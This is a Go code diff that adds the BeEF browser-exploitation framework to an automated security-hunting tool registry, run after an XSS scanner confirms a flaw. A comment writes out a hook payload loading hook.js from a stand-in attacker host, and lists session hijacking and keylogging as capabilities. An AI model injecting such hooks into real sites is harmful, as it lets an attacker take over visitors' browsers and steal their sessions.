@@ -800,6 +800,31 @@ var huntRegistry = []HuntToolSpec{
 		},
 	},
 
+	// ── NEW 2025: beef-xss — Browser Exploitation Framework ──────────────────
+	// Hooks browsers via XSS → 200+ client-side attack modules
+	// Runs AFTER dalfox confirms XSS — hooks the vulnerable URL
+	// Capabilities: session hijack, keylog, screenshot, network pivot, phishing
+	{
+		Name:        "beef-xss",
+		Phase:       4,
+		Timeout:     120,
+		DomainOnly:  true,
+		InstallHint: "sudo apt install beef-xss -y",
+		BuildArgs: func(target string, ctx *HuntContext) []string {
+			// Start BeEF REST API — returns hook URL for injection
+			// BeEF hook: <script src="http://LHOST:3000/hook.js"></script>
+			return []string{
+				"--config", "/etc/beef-xss/config.yaml",
+				"--verbose",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *HuntContext) []string{
+			func(target string, ctx *HuntContext) []string {
+				return []string{"--config", "/etc/beef-xss/config.yaml"}
+			},
+		},
+	},
+
 	// ══════════════════════════════════════════════════════════════════════════
 	// PHASE 5 — DEEP VULNERABILITY SCAN
 	// Goal: CVEs, RCE, LFI, SSRF, misconfigs — full template coverage
